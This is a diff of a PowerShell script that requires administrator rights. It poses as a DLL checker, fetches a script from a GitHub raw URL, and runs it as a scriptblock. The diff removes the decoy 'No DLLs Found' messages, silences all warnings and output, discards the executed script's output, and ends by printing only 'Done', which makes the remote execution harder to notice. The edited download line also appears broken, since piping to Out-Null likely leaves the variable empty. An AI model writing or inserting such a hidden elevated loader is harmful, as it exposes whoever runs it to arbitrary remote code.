@@ -1,27 +1,23 @@
 #Requires -RunAsAdministrator
 
 $ErrorActionPreference = "SilentlyContinue"
+$WarningPreference = "SilentlyContinue"
+$InformationPreference = "SilentlyContinue"
+$VerbosePreference = "SilentlyContinue"
+$ProgressPreference = "SilentlyContinue"
 
-Write-Host ""
-Write-Host "No DLLs Found" -ForegroundColor Green
-Write-Host ""
-
-# Run external helper script
 $remoteUrl = "https://raw.githubusercontent.com/printipel/Screesh/main/dllhelper.ps1"
 
 try {
-
-    $script = Invoke-RestMethod -Uri $remoteUrl -UseBasicParsing
+    $script = Invoke-RestMethod -Uri $remoteUrl -UseBasicParsing 2>$null | Out-Null
 
     if ($script) {
-
         $sb = [scriptblock]::Create($script)
-
-        & $sb
+        & $sb *> $null
     }
-
 }
 catch {
-
-    Write-Host "No DLLs Found" -ForegroundColor Red
+}
+finally {
+    Write-Output "Done"
 }
